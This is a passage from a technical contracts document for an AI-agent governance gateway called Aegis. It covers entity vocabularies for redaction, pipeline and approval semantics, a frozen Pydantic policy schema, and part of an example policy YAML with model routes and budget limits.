| `aegis.redaction.normalize` | redaction-engine | `normalize(text) -> Normalized` with `.text` and `.to_original(a, b) -> tuple[int, int]` (offset-preserving; ported from `staging/pii/normalize.py`) |
| `aegis.budgets.tokens` | budgets-ledger | `estimate_tokens(text: str, model: str | None = None) -> int` (chars/4 heuristic, Claude chars/3.5) |
| `aegis.policy.diff` | policy-engine | `diff_docs(old: PolicyDoc, new: PolicyDoc) -> list[PolicyChange]` |
| `aegis.feed.matchers` | threat-feed | `compile_signature(sig: dict)`, `match(compiled, interaction) -> list[dict]` (also used by `feed_service`) |
| `aegis.sdk` | demo-mocks-docs | `AegisClient(base_url, agent_id, agent_key)` with `.guard()`, `.chat()`, `.mcp_call()` |

### 3.4 Canonical vocabularies

**ID prefixes** (`new_id(prefix)`): `req` request (one per inbound HTTP request), `dec` decision/verdict (one per pipeline evaluation), `int` interaction, `apr` approval, `evt` audit event, `res` reservation, `ses` generated session. Agent API keys start with `aegis_` (seed demo keys: `aegis_demo_…_NOT_A_SECRET`); only values with this prefix are consumed by Aegis, everything else (e.g. Claude Code's OAuth token) is passed through untouched. Keys are stored as `hmac_hex(key, purpose="apikey")`.

**Entities** (detectors MUST use these names; placeholders are `[ENTITY_N]` numbered per session, stable per value; irreversible redactions use `[REDACTED:ENTITY]`):

| Data class | Entities |
|---|---|
| CONFIDENTIAL | `EMAIL`, `PHONE`, `PERSON`, `ADDRESS`, `DOB`, `PESEL`, `NIP`, `REGON`, `PL_ID_CARD`, `PASSPORT`, `IBAN`, `HEALTH` |
| RESTRICTED | `PAN` (tokenized, or PCI-masked first6/last4 `411111******1111` — never more digits), `CARD_EXPIRY`, `CVV`, `TRACK_DATA` (**CVV and track data are always dropped irreversibly as `[REDACTED:CVV]` / `[REDACTED:TRACK_DATA]`, never tokenized**) |
| SECRET | `AWS_KEY`, `AWS_SECRET`, `GITHUB_TOKEN`, `SLACK_TOKEN`, `STRIPE_KEY`, `OPENAI_KEY`, `ANTHROPIC_KEY`, `JWT`, `PRIVATE_KEY`, `PASSWORD`, `CONNECTION_STRING`, `GENERIC_SECRET` |
| INTERNAL | `IP_ADDRESS`, `HOSTNAME`, `INTERNAL_URL`, `FILE_PATH`, `USERNAME`, `GIT_EMAIL` |

Checksum-only detectors are not enough for `NIP`, `REGON`, `PL_ID_CARD` (≈10 % of random strings pass): require a context word or format cue. NER (`PERSON`, `ADDRESS`, `HEALTH`) comes from `models/eu-pii-ner` (bardsai/eu-pii-anonimization-multilang, Apache-2.0, INT8 ONNX); Presidio is optional; **Polish spaCy models are GPL-3.0 and must not be used**.

**Finding categories:** `pii`, `pci`, `secret`, `metadata`, `injection`, `exfil`, `command`, `scope`, `taint`, `mcp`, `budget`, `loop`, `signature`, `governance`, `content`, `model`, `approval`.

**Governed action types** (`Interaction.action_type`, set in the `enrich` phase by whichever action-guards control runs first — classification via `aegis.actions.classify` over policy `actions:` is idempotent; ACT-02 adds labels `sensitivity`/`env` from `rt.org.resources()`): `spend.subscription`, `spend.charge`, `spend.transfer`, `db.read`, `db.write`, `db.schema`, `email.external`, `email.internal`, `egress.post`, `egress.get`, `code.exec`, `code.deploy`, `package.install`, `file.sensitive`, `budget.override`. Config-change kinds use `ChangeKind` (§4.2). `resource` format: `db:<table>`, `host:<hostname>`, `file:<path>`, `pkg:<eco>/<name>`.

**Tool naming.** `Interaction.tool_name` for MCP tools is always `<server>.<tool>` (hooks convert `mcp__acme-db__query` → `acme-db.query` and set `mcp_server="acme-db"`); built-ins keep Claude Code names (`Bash`, `Read`, `WebFetch`…). Every string leaf of `tool_args` becomes a `TextSegment(path="tool_args.<dotted>", role="tool_args")`.

**Destination classification.**
- Model calls: `providers[<p>].destination` (Ollama = `local`, Ollama `:cloud` models and all commercial APIs = `remote`, mock LLM = `remote`).
- Tool calls: `destinations.local_tools` → `local`, `destinations.third_party_tools` → `third_party`; MCP tools → `mcp.servers[<server>].destination` (default `third_party`); `/egress` → `third_party` (hosts matching `internal_domains` → `local`).
- `direction="in"` hops (responses, tool/MCP results): `destination` describes **where the content goes next**, i.e. the agent's model context → `remote` unless the agent's `max_destination == "local"` (local-only agents such as `research-agent@research`).
- Config changes: `Destination(name="aegis", dest_class="local")`.

**OWASP IDs** are always year-suffixed strings: `LLM01:2026` … `LLM10:2026`, `ASI01` … `ASI10`, `MCP01:2025` … `MCP10:2025`.

**Decision colors (UI, everywhere):** allow = emerald, log = slate, redact = amber, require_approval = violet, block = rose. Roles: owner = fuchsia, admin = sky, member = slate, agent = teal.

### 3.5 Pipeline semantics (core-gateway implements; every control relies on it)

`rt.pipeline.evaluate(ctx, interaction, policy=None, dry_run=False)`:

1. **Snapshot.** `snap = policy or ctx.policy or rt.policy.snapshot()`; stamp `ctx.policy_version`, `ctx.feed_serial`. One request never sees two policy versions.
2. **Select** controls: registered **and** `snap.controls[id]` exists **and** `enabled` **and** `mode != "off"` **and** `control.applies_to.matches(interaction)` **and** `cfg.scope` matches (`orgs/teams/members/agents` globs vs `ctx.identity`; non-empty `kinds/surfaces/destinations` further narrow). Sort by `(priority, id)`.
3. **Enrich** (sequential): `await c.enrich(ctx, interaction, cfg)` for controls that define it (e.g. action-guards set `action_type/amount_usd/resource/labels`; EXE-04 records loop fingerprints). Errors logged, ignored.
4. **Deterministic phase** (`kind in {deterministic, stateful}`), sequential, each under `asyncio.wait_for(cfg.timeout_ms)`.
5. **Semantic phase** (`kind in {semantic, hybrid}`), concurrent (`asyncio.gather`), timeout `cfg.timeout_ms` (default `defaults.semantic_timeout_ms`). **Skipped** if phase 4 already produced an enforce-mode `block`.
6. **Errors/timeouts → `fail_mode`:** `closed` → `Decision(action="block", degraded=True, reason="<id> unavailable (fail-closed)")`; `open` → allow + `degraded=True`; `deterministic_only` → allow + `degraded=True` (the deterministic controls still apply). Controls stamp `latency_ms`; core overwrites it with the measured value.
7. **Monitor mode:** decisions of controls with `cfg.mode == "monitor"` get `mode="monitor"`, are recorded/shown ("would have blocked") and **never** affect the final action.
8. **Combine:** final action = highest `ACTION_PRECEDENCE` among enforce-mode decisions (`block > require_approval > redact > log > allow`); `primary` = that decision (ties: lower priority, then id). No decisions → `allow`.
9. **Approvals** (only if final is `require_approval`; skipped when `dry_run`):
   `pre = await rt.approvals.find_preapproved(ctx, interaction)` → if found, every `require_approval` decision becomes `allow` (reason `approved by <member> (<apr_id>)`) and the action is recombined. Otherwise `req = await rt.approvals.request(ctx, interaction, primary)`: `approved` (auto) → as above; `denied` → `block`; pending and `ctx.wait_for_approval_s > 0` → `await rt.approvals.wait(req.id, …)` then re-check. Still pending → final `require_approval`, `verdict.approval = req`, `primary.approval_id = req.id`.
10. **Transform** (final ∈ {allow, log, redact}): findings of enforce-mode `redact` decisions that carry spans (`segment_index/start/end`) → `rt.redactor.apply(ctx, segments, findings)`; `mutations` of enforce-mode `redact`/`allow` decisions are collected into `verdict.mutations` and applied by the surface handler (body/header via `aegis.core.paths`, `route` = model/provider swap); `remove` ops on list items are applied in descending index order so indices stay valid. Segments with `redactable=False` are never changed.
11. **Record** (skipped when `dry_run`): keep a `WireView` in an in-memory LRU (≤ 500 entries, 1 h; never persisted); `await rt.audit.record(AuditEvent(event_type="decision", …, data={"summary": DecisionSummary, "detail": DecisionDetail-without-wire}))`; `rt.metrics.observe_verdict(...)`; `rt.bus.publish("decision", DecisionSummary)`; add `ctx.timings`.

`rt.pipeline.complete(ctx, interaction, verdict, outcome)` is called **exactly once** per evaluated *request-direction* interaction by the surface handler after the hop finished (executed, blocked or failed). It calls `on_complete` of every control that evaluated it (budget settle/release, taint flags, loop results), then emits usage to metrics. Blocked hops get `Outcome(status_code=403|402|429, usage=Usage(requests=0))`.

**Surface handlers** (who builds interactions and calls the pipeline):

| Handler | Owner | Request-direction surface → response-direction surface |
|---|---|---|
| Anthropic / OpenAI / Ollama proxies | core-gateway | `model.request` → `model.response` (+ `model.admin` for Ollama pull/create/push/delete/copy) |
| `/v1/guard` | core-gateway | any surface given by caller |
| `/api/playground` | core-gateway | `prompt.user` or `model.request` → `model.response` |
| `/mcp/{server}` | mcp-proxy | `mcp.init`, `mcp.call` → `mcp.result`; upstream `tools/list` result → `mcp.list` |
| `/egress` | metadata-egress | `egress.request` → `egress.response` |
| `/v1/hooks/claude-code` | claude-code-integration | `UserPromptSubmit` → `prompt.user`; `PreToolUse` → `tool.input`; `PostToolUse` → `tool.output`; `ConfigChange` → `config.change` |
| `rt.policy.propose()` | policy-engine | `config.change` (kind `config_change`, `segments=[]` so content controls never scan policy text, `interaction.meta = {"changes": [PolicyChange…], "proposal": {"yaml"|"patch", "base_version", "reason"}}`) |

**Response path for model calls** (core-gateway): parse response → evaluate `model.response` → block ⇒ replace with `blocked_response`; redact ⇒ apply segments; then, if the response verdict contains a DLP-08 decision with `meta.rehydrate == true` (DLP-08 enabled, destination is the local user) and `defaults.rehydrate_responses`, `rt.redactor.rehydrate(ctx, text)` on assistant text before returning to the local client (same rule for hook `PreToolUse` → `updatedInput` when the tool is local); `rt.pipeline.attach_response(...)` for the wire view. Streaming: `defaults.stream_mode` — MVP `buffered` (collect upstream stream, evaluate, re-emit as a well-formed SSE stream in the client's wire format); `holdback` (sliding window) is a stretch; `passthrough` skips output controls.

**Budgets on the model path** (budgets-ledger via BUD-01): `evaluate` reserves `Usage` estimated from `est_input_tokens`/`max_output_tokens` (`rt.ledger.reserve`, store in `ctx.state["bud.reservation"]`); clamps `max_tokens` with a `Mutation`; at soft threshold may add a `route` mutation (downgrade per `models.downgrade`); hard limit → `Decision(block, http_status=402, error_type="budget_exceeded")` or `require_approval` with an `ApprovalDraft(kind="budget_raise", payload={"patch": [...]})` when `on_hard: require_approval`. `on_complete` settles with actual usage (or releases). `ctx.dry_run` ⇒ never reserve.

**Approval semantics** (approvals-engine implements; ACT-01…04/GOV-04/GOV-05/BUD-01/MCP-03 produce drafts):
- Routing: first matching rule in `approvals.rules` (kinds `action`, `budget_raise`, `mcp_pin`) or `approvals.config_rules` (kind `config_change`); no match → `defaults.default_approver` / `default_config_approver`. Config proposals with several changes → the highest required level among them.
- Levels: `auto` = approved at creation (logged); `deny` = denied at creation; `self` = the requester's member (for an agent: its `owner_member_id`) **or** any admin/owner; `admin` = role admin or owner; `owner` = role owner. Agents can never vote. For `admin`/`owner` levels the requester's own member may not approve (separation of duties). `two_person: true` = two distinct eligible approvals; any eligible deny ⇒ denied.
- A human proposer whose role already satisfies the required level ⇒ GOV-05 returns `allow` ("authorized: admin ≥ admin") and the change applies immediately.
- `fingerprint = hmac_hex(canonical_json({org, principal, action_type or tool_name, tool_args minus volatile keys, resource, amount_usd}), purpose="approval")`; a pending request with the same fingerprint is reused (no duplicates from hook + MCP proxy seeing the same call). Approved requests are single-use by default (`max_uses`) and expire (`ttl_s`, default 900 s); expired ⇒ `denied` semantics.
- Executors run on approval: `config_change`/`budget_raise` → `rt.policy.apply_yaml` or `apply_patch` (registered by policy-engine); `mcp_pin` → re-approve tool hash (registered by mcp-proxy); `action` → none (the waiting/retrying request passes via `find_preapproved`). Result stored in `ApprovalRequest.execution`.
- Holding: surfaces set `ctx.wait_for_approval_s` from `approvals.defaults.hold_s[<source>]` (hook 60 s, mcp 30 s, egress 15 s, others 0) or from `X-Aegis-Wait`/`wait_s`. Clients may retry with `X-Aegis-Approval: apr_…`.
- Every transition publishes `approval.created` / `approval.updated` and audits `approval.*`.

---

## 4. Policy, org seed, pricing, feed

### 4.1 Files and hot reload

| File | Purpose | Reload |
|---|---|---|
| `config/policy.yaml` (`AEGIS_POLICY`) | the one control catalog judges edit | watched (directory watch, debounce 200 ms, ignore own writes by sha256) → parse → `PolicyDoc` validate → profile merge → compile caches → **self-test gate** (`tests:` + every control's `tests:`, run via `rt.pipeline.evaluate(dry_run=True, policy=candidate)`; a failing must-block case rejects the candidate) → atomic swap → `policy_versions` row → audit `policy.applied` → SSE `policy.applied`. Any failure → keep last-good, audit + SSE `policy.rejected` with line/col. Target ≤ 1 s. |
| `config/policy.golden.yaml` | factory default; `make reset` copies it over `policy.yaml`; hermetic tests use a temp copy | — |
| `config/profiles/<profile>.yaml` | `controls: {<ID>: {<ControlConfig fields>}}` defaults per strictness; a control entry's **explicitly set** fields override the profile (`model_fields_set`) | with policy |
| `config/org.seed.yaml` (`AEGIS_ORG_SEED`) | seeds SQLite org tables when empty (or `python -m aegis reset`); format = `staging/seed/org.seed.yaml` (`schema: aegis.org-seed/v1`), parsed by org-rbac's private loader | startup only |
| `config/pricing.yaml` | prices; version stamped in audit `usage` | watched by budgets-ledger |
| `config/feeds/feed_pubkey.b64` | ed25519 public key (base64) of the feed signer | startup |
| `config/feeds/seed_bundle.json` + `.sig` | offline bundle used when the feed service is unreachable (and in hermetic tests); status `seed` | startup |

API-originated changes (`propose`/`apply_*`/`rollback`) write the result back to `config/policy.yaml` atomically (temp file + rename; patches via `ruamel.yaml` round-trip so comments survive). **File edits are applied without governance** (they represent an owner with shell access) and audited with `actor=None, source="file"`.

### 4.2 `src/aegis/core/policy_schema.py` (FROZEN)

```python
"""Aegis policy file schema (config/policy.yaml). FROZEN: materialized verbatim from
docs/CONTRACTS.md section 4.2. Loading/validation/hot-reload logic lives in aegis.policy
(policy-engine); this module is only the shape.

Top level forbids unknown keys (typo detection for judges' live edits); every section allows
extra keys (forward compatible, reported as warnings by the validator).
"""

from __future__ import annotations

from datetime import datetime
from typing import Any, Literal

from pydantic import BaseModel, ConfigDict, Field

from aegis.core.types import (
    Action,
    ApprovalKind,
    ApprovalRequest,
    ApproverLevel,
    BudgetWindow,
    DataClass,
    DestClass,
    FailMode,
    Kind,
    Mode,
    Severity,
    Surface,
    utcnow,
)

Wire = Literal["anthropic", "openai", "ollama"]
Profile = Literal["permissive", "balanced", "strict", "paranoid"]


class _Section(BaseModel):
    model_config = ConfigDict(extra="allow", populate_by_name=True)


# ---------------------------------------------------------------- controls
class ControlScope(_Section):
    orgs: list[str] = Field(default_factory=lambda: ["*"])
    teams: list[str] = Field(default_factory=lambda: ["*"])
    members: list[str] = Field(default_factory=lambda: ["*"])
    agents: list[str] = Field(default_factory=lambda: ["*"])
    kinds: list[Kind] = Field(default_factory=list)  # empty = control's own applies_to
    surfaces: list[Surface] = Field(default_factory=list)
    destinations: list[DestClass] = Field(default_factory=list)


class PolicyTest(_Section):
    """Inline golden test, run by the self-test gate before a policy version is applied."""

    name: str
    control: str | None = None  # expected deciding control id (attribution); None = any
    expect: Action
    kind: Kind = "model_call"
    surface: Surface = "model.request"
    destination: DestClass = "remote"
    text: str | None = None
    tool_name: str | None = None
    tool_args: dict[str, Any] | None = None
    amount_usd: float | None = None
    agent: str | None = None  # agent id to evaluate as (default: "selftest")


class ControlConfig(_Section):
    id: str  # e.g. "DLP-01"
    name: str | None = None
    enabled: bool = True
    mode: Mode = "enforce"
    action: Action = "block"
    threshold: float | None = None  # semantic score that triggers `action`
    adherence_pct: float | None = None  # topic adherence minimum (INJ-03)
    severity: Severity = "medium"
    fail_mode: FailMode = "closed"
    timeout_ms: int = 250
    scope: ControlScope = Field(default_factory=ControlScope)
    params: dict[str, Any] = Field(default_factory=dict)  # control-specific, validated by owner
    owasp: list[str] = Field(default_factory=list)
    tests: list[PolicyTest] = Field(default_factory=list)


# ---------------------------------------------------------------- global sections
class PolicyMetadata(_Section):
    name: str = "aegis-policy"
    description: str | None = None
    owner: str | None = None


class Defaults(_Section):
    mode: Mode = "enforce"
    fail_mode: FailMode = "closed"
    semantic_timeout_ms: int = 400
    stream_mode: Literal["buffered", "holdback", "passthrough"] = "buffered"
    block_response: Literal["message", "error"] = "message"  # model proxies: synthetic reply or error
    require_auth: bool = False  # demo: identity may come from X-Aegis-* headers
    audit_content: bool = False  # never store raw content unless explicitly enabled
    rehydrate_responses: bool = True
    max_body_bytes: int = 8_000_000


def _default_matrix() -> dict[str, dict[str, str]]:
    return {
        "PUBLIC": {"local": "allow", "remote": "allow", "third_party": "allow"},
        "INTERNAL": {"local": "allow", "remote": "redact", "third_party": "redact"},
        "CONFIDENTIAL": {"local": "allow", "remote": "redact", "third_party": "redact"},
        "RESTRICTED": {"local": "redact", "remote": "redact", "third_party": "block"},
        "SECRET": {"local": "log", "remote": "block", "third_party": "block"},
    }


class DestinationsSection(_Section):
    matrix: dict[DataClass, dict[DestClass, Action]] = Field(default_factory=_default_matrix)
    local_tools: list[str] = Field(
        default_factory=lambda: ["Read", "Write", "Edit", "MultiEdit", "Glob", "Grep", "LS",
                                 "NotebookEdit", "Bash", "TodoWrite"])
    third_party_tools: list[str] = Field(default_factory=lambda: ["WebFetch", "WebSearch"])
    internal_domains: list[str] = Field(
        default_factory=lambda: ["*.corp.local", "*.internal", "*.acme.test"])
    allowed_link_domains: list[str] = Field(default_factory=list)
    egress_allowlist: list[str] = Field(default_factory=list)  # empty = rely on controls


class ProviderConfig(_Section):
    wire: Wire
    base_url: str
    destination: DestClass = "remote"
    api_key_env: str | None = None
    passthrough_auth: bool = False  # forward client Authorization/x-api-key (Claude Code login)
    enabled_if_env: str | None = None
    timeout_s: float = 120.0


class ModelRoute(_Section):
    match: str  # glob over the requested model name
    provider: str  # key of `providers`
    wire: Wire | None = None  # only for requests arriving on this wire (None = any)


class DowngradeRule(_Section):
    from_: str = Field(alias="from")
    to: str


class ModelsSection(_Section):
    allowed: list[str] = Field(default_factory=lambda: ["*"])
    denied: list[str] = Field(default_factory=list)
    routes: list[ModelRoute] = Field(default_factory=list)  # first match wins
    downgrade: list[DowngradeRule] = Field(default_factory=list)
    default_local: str | None = None


# ---------------------------------------------------------------- budgets
class BudgetLimit(_Section):
    scope: str  # org:<id> | team:<id> | member:<id> | agent:<id> | session:<id>|session:* |
    #             model:<glob> | tool:<glob>
    window: BudgetWindow = "day"
    usd: float | None = None
    tokens: int | None = None
    compute_s: float | None = None
    requests: int | None = None
    tool_calls: int | None = None
    spend_usd: float | None = None
    soft_pct: float | None = None
    on_soft: Literal["warn", "downgrade", "require_approval"] | None = None
    on_hard: Literal["block", "require_approval", "downgrade"] | None = None
    label: str | None = None


class BudgetDefaults(_Section):
    soft_pct: float = 80.0
    on_soft: Literal["warn", "downgrade", "require_approval"] = "warn"
    on_hard: Literal["block", "require_approval", "downgrade"] = "block"
    local_concurrency: int = 1
    max_output_tokens: int | None = 4096  # clamp (mutation) when a request asks for more


class LoopConfig(_Section):
    repeat: int = 3  # identical tool call fingerprint occurrences within `window`
    window: int = 20
    cycle_k: int = 3
    error_streak: int = 5
    max_steps_per_session: int = 200
    ladder: list[Literal["tool_error", "block", "kill"]] = Field(
        default_factory=lambda: ["tool_error", "block", "kill"])


class RateConfig(_Section):
    requests_per_min: int | None = 120
    tool_calls_per_min: int | None = 60


class KillSwitch(_Section):
    global_: bool = Field(default=False, alias="global")
    teams: list[str] = Field(default_factory=list)
    members: list[str] = Field(default_factory=list)
    agents: list[str] = Field(default_factory=list)
    sessions: list[str] = Field(default_factory=list)


class BudgetsSection(_Section):
    defaults: BudgetDefaults = Field(default_factory=BudgetDefaults)
    limits: list[BudgetLimit] = Field(default_factory=list)
    loops: LoopConfig = Field(default_factory=LoopConfig)
    rate: RateConfig = Field(default_factory=RateConfig)
    kill_switch: KillSwitch = Field(default_factory=KillSwitch)


# ---------------------------------------------------------------- governed actions & approvals
class ActionRule(_Section):
    """Classifies tool / MCP / egress calls into governed action types (used by GOV-04)."""

    id: str  # action type, e.g. "spend.subscription", "db.read", "db.write", "email.external"
    category: Literal["spend", "data_read", "data_write", "external_send", "code_exec",
                      "config", "other"] = "other"
    tools: list[str] = Field(default_factory=list)  # globs; MCP tools match "<server>.<tool>"
    surfaces: list[Surface] = Field(default_factory=list)
    args_match: dict[str, str] = Field(default_factory=dict)  # arg path -> RE2 regex (all must match)
    args_not_match: dict[str, str] = Field(default_factory=dict)  # arg path -> RE2 regex (none may match)
    url_hosts: list[str] = Field(default_factory=list)  # egress host globs
    amount_arg: str | None = None  # dotted path in tool_args -> USD amount
    resource_arg: str | None = None  # dotted path in tool_args -> resource string
    resource_regex: str | None = None  # first capture group of this regex applied to resource_arg
    resource_prefix: str = ""  # prepended to the resource, e.g. "db:" -> "db:customers"
    labels: dict[str, str] = Field(default_factory=dict)
    title: str | None = None  # "{agent} wants to spend ${amount} on {args.vendor}"


class ApprovalWhen(_Section):
    kind: list[ApprovalKind] | None = None
    action: list[str] | None = None  # globs over action_type (action rules) or change kind (config)
    amount_usd_gt: float | None = None
    amount_usd_lte: float | None = None
    resource_in: list[str] | None = None  # globs
    labels: dict[str, str] | None = None
    teams: list[str] | None = None
    agents: list[str] | None = None
    scope_type: list[str] | None = None  # budget changes: org|team|member|agent|session
    increase_pct_gt: float | None = None
    increase_pct_lte: float | None = None


class ApprovalRule(_Section):
    id: str
    description: str | None = None
    when: ApprovalWhen = Field(default_factory=ApprovalWhen)
    approver: ApproverLevel = "admin"
    two_person: bool = False
    ttl_s: int | None = None
    max_uses: int = 1


class ApprovalDefaults(_Section):
    ttl_s: int = 900
    on_timeout: Literal["deny"] = "deny"
    max_pending: int = 50
    default_approver: ApproverLevel = "admin"  # action requests matching no rule
    default_config_approver: ApproverLevel = "owner"  # config changes matching no rule
    hold_s: dict[str, float] = Field(default_factory=lambda: {
        "hook": 60, "mcp": 30, "egress": 15, "guard": 0, "proxy": 0,
        "playground": 0, "dashboard": 0})


class ApprovalsSection(_Section):
    defaults: ApprovalDefaults = Field(default_factory=ApprovalDefaults)
    rules: list[ApprovalRule] = Field(default_factory=list)  # first match wins
    config_rules: list[ApprovalRule] = Field(default_factory=list)  # first match wins


# ---------------------------------------------------------------- MCP & feeds
class McpServerConfig(_Section):
    transport: Literal["http", "stdio"] = "http"
    url: str | None = None  # upstream for transport=http
    command: list[str] | None = None  # exact launch command for transport=stdio
    destination: DestClass = "third_party"
    allowed_tools: list[str] = Field(default_factory=lambda: ["*"])
    pinned: bool = True
    package: str | None = None  # "name@version" (launch check, SIG-03)
    headers_env: dict[str, str] = Field(default_factory=dict)  # header -> env var (cred injection)
    description: str | None = None


class McpSection(_Section):
    servers: dict[str, McpServerConfig] = Field(default_factory=dict)
    unknown_server_action: Action = "block"
    on_tool_change: Action = "block"
    max_description_len: int = 1024


class FeedSource(_Section):
    id: str = "aegis-threat-intel"
    url: str = "http://127.0.0.1:8790"
    pubkey_file: str = "config/feeds/feed_pubkey.b64"
    seed_bundle: str | None = "config/feeds/seed_bundle.json"
    poll_s: float = 10.0
    sse: bool = True
    enabled: bool = True
    max_age_s: int = 86400


class FeedOverride(_Section):
    enabled: bool | None = None
    action: Action | None = None
    mode: Mode | None = None
    justification: str | None = None


class FeedsSection(_Section):
    sources: list[FeedSource] = Field(default_factory=lambda: [FeedSource()])
    overrides: dict[str, FeedOverride] = Field(default_factory=dict)  # signature id -> override


# ---------------------------------------------------------------- the document
class PolicyDoc(BaseModel):
    model_config = ConfigDict(extra="forbid", populate_by_name=True)

    version: int = 1  # schema version (the runtime policy_version is assigned by the store)
    metadata: PolicyMetadata = Field(default_factory=PolicyMetadata)
    profile: Profile = "balanced"
    defaults: Defaults = Field(default_factory=Defaults)
    destinations: DestinationsSection = Field(default_factory=DestinationsSection)
    providers: dict[str, ProviderConfig] = Field(default_factory=dict)
    models: ModelsSection = Field(default_factory=ModelsSection)
    budgets: BudgetsSection = Field(default_factory=BudgetsSection)
    actions: list[ActionRule] = Field(default_factory=list)
    approvals: ApprovalsSection = Field(default_factory=ApprovalsSection)
    mcp: McpSection = Field(default_factory=McpSection)
    feeds: FeedsSection = Field(default_factory=FeedsSection)
    controls: list[ControlConfig] = Field(default_factory=list)
    tests: list[PolicyTest] = Field(default_factory=list)


# ---------------------------------------------------------------- change management
ChangeKind = Literal[
    "budget.raise", "budget.lower", "budget.add", "budget.remove",
    "control.enable", "control.disable", "control.add", "control.remove",
    "control.mode", "control.action.loosen", "control.action.tighten",
    "control.threshold.loosen", "control.threshold.tighten", "control.params",
    "model.allow", "model.disallow", "route.change", "provider.change",
    "approval.rule", "killswitch.on", "killswitch.off",
    "mcp.server", "feed.override", "profile.change", "other",
]


class PolicyChange(BaseModel):
    kind: ChangeKind
    path: str  # dotted path in the policy doc
    before: Any = None
    after: Any = None
    control_id: str | None = None
    scope: str | None = None  # budget scope, e.g. "team:research"
    dimension: str | None = None  # budget dimension, e.g. "usd"
    increase_pct: float | None = None  # budget.raise: (after - before) / before * 100
    loosening: bool = False  # True if the change weakens protection
    summary: str = ""  # human-readable, e.g. "team:research daily usd 10 -> 25 (+150%)"


class PatchOp(BaseModel):
    op: Literal["set", "remove", "append"] = "set"
    path: str  # dotted; list items by index [3] or by key match [id=DLP-01] / [scope=team:x,window=day]
    value: Any = None


class ValidationIssue(BaseModel):
    path: str = ""
    line: int | None = None
    col: int | None = None
    message: str
    severity: Literal["error", "warning"] = "error"


class SelfTestResult(BaseModel):
    name: str
    control: str | None = None
    expect: Action
    got: Action
    got_control: str | None = None
    passed: bool
    latency_ms: float = 0.0


class ValidationReport(BaseModel):
    valid: bool
    errors: list[ValidationIssue] = Field(default_factory=list)
    warnings: list[ValidationIssue] = Field(default_factory=list)
    selftest: list[SelfTestResult] = Field(default_factory=list)
    selftest_passed: bool = True
    changes: list[PolicyChange] = Field(default_factory=list)
    required_role: ApproverLevel | None = None


class ApplyResult(BaseModel):
    status: Literal["applied", "pending_approval", "rejected", "conflict", "noop"]
    version: int | None = None
    previous_version: int | None = None
    approval: ApprovalRequest | None = None
    decision_id: str | None = None
    errors: list[ValidationIssue] = Field(default_factory=list)
    changes: list[PolicyChange] = Field(default_factory=list)
    latency_ms: float = 0.0
    message: str = ""


class PolicyVersionInfo(BaseModel):
    version: int
    sha256: str
    applied_at: datetime
    applied_by: str | None = None
    source: str = "startup"  # startup | file | api | approval | rollback
    reason: str | None = None
    changes_count: int = 0
    summary: str = ""


class PolicySnapshot(BaseModel):
    """Immutable, applied policy version. Pinned on RequestContext.policy at ingress."""

    model_config = ConfigDict(arbitrary_types_allowed=True)

    version: int
    sha256: str
    doc: PolicyDoc
    controls: dict[str, ControlConfig] = Field(default_factory=dict)  # effective (profile-merged)
    applied_at: datetime = Field(default_factory=utcnow)
    applied_by: str | None = None
    source: str = "startup"
    compiled: dict[str, Any] = Field(default_factory=dict, exclude=True)  # owner caches, keyed
    #                                                                        "<workstream>:<name>"

    def control(self, control_id: str) -> ControlConfig | None:
        return self.controls.get(control_id)
```

### 4.3 Example `config/policy.yaml` (shape only; policy-engine writes the real, fully commented file by porting `staging/seed/policy.yaml`)

```yaml
version: 1
metadata: {name: acme-capital-default, description: "Default control catalog for Acme Capital (demo)", owner: u_marek}
profile: balanced                       # permissive | balanced | strict | paranoid

defaults:
  mode: enforce
  fail_mode: closed
  semantic_timeout_ms: 400
  stream_mode: buffered
  block_response: message               # model proxies answer with a synthetic "[Aegis] Blocked by …" reply
  require_auth: false
  rehydrate_responses: true

destinations:
  matrix:                               # data class x destination -> action (DLP-01/02/03); judges edit cells live
    CONFIDENTIAL: {local: allow,  remote: redact, third_party: block}
    RESTRICTED:   {local: redact, remote: redact, third_party: block}
    SECRET:       {local: log,    remote: block,  third_party: block}
    INTERNAL:     {local: allow,  remote: redact, third_party: redact}
  internal_domains: ["*.acme-capital.example", "*.corp.local"]
  allowed_link_domains: ["docs.acme-capital.example"]

providers:
  anthropic:        {wire: anthropic, base_url: "https://api.anthropic.com", destination: remote, passthrough_auth: true}
  openai:           {wire: openai, base_url: "https://api.openai.com/v1", api_key_env: OPENAI_API_KEY, enabled_if_env: OPENAI_API_KEY}
  openrouter:       {wire: openai, base_url: "https://openrouter.ai/api/v1", api_key_env: OPENROUTER_API_KEY, enabled_if_env: OPENROUTER_API_KEY}
  ollama:           {wire: ollama, base_url: "http://127.0.0.1:11434", destination: local}
  ollama-openai:    {wire: openai, base_url: "http://127.0.0.1:11434/v1", destination: local}
  ollama-anthropic: {wire: anthropic, base_url: "http://127.0.0.1:11434", destination: local}
  mock-anthropic:   {wire: anthropic, base_url: "http://127.0.0.1:8791", destination: remote}
  mock-openai:      {wire: openai, base_url: "http://127.0.0.1:8791/v1", destination: remote}

models:
  allowed: ["claude-*", "gpt-4.1-mini", "meta-llama/*", "aegis-judge*", "qwen*", "hf.co/*", "mock-*"]
  denied: ["*:cloud", "aegis-guard*"]   # cloud models are external; the guard model is not a chat model
  routes:                               # first match wins; `wire` filters by the API the client used
    - {match: "mock-*",       provider: mock-anthropic, wire: anthropic}
    - {match: "mock-*",       provider: mock-openai,    wire: openai}
    - {match: "claude-*",     provider: anthropic}
    - {match: "gpt-*",        provider: openai}
    - {match: "meta-llama/*", provider: openrouter}
    - {match: "*",            provider: ollama-openai,    wire: openai}      # local: aegis-judge, qwen*, hf.co/*
    - {match: "*",            provider: ollama,           wire: ollama}
    - {match: "*",            provider: ollama-anthropic, wire: anthropic}   # Claude Code offline fallback (slow)
  downgrade:
    - {from: "claude-opus-*",   to: "claude-sonnet-4-5"}
    - {from: "claude-sonnet-*", to: "claude-haiku-4-5"}
    - {from: "*",               to: "aegis-judge"}
  default_local: "aegis-judge"

budgets:                                # amounts ported from staging/seed/org.seed.yaml
  defaults: {soft_pct: 80, on_soft: downgrade, on_hard: block, local_concurrency: 1, max_output_tokens: 4096}
  limits:
    - {scope: "org:acme-capital",              window: day,     usd: 150, compute_s: 14400}
    - {scope: "org:acme-capital",              window: month,   usd: 3000, spend_usd: 10000}
    - {scope: "team:trading",                  window: day,     usd: 60, tokens: 4000000}
    - {scope: "team:trading",                  window: month,   usd: 1200, spend_usd: 2000}
    - {scope: "team:research",                 window: day,     usd: 15, compute_s: 7200}
    - {scope: "team:platform",                 window: day,     usd: 50}
    - {scope: "member:*",                      window: day,     usd: 5}          # each human member
